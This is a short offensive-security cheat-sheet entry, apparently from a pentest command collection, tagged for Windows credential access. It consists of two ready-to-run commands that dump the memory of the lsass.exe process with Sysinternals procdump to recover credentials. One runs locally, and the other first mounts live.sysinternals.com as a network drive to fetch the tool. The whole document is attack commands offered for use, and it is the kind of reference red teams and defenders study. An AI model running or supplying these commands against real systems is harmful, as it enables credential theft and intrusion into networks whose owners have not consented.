# procdump

% procdump, lsass, credentials
#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## procdump - dump lsass - local
```cmd
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

## procdump - dump lsass - remote
```cmd
net use Z: https://live.sysinternals.com; Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
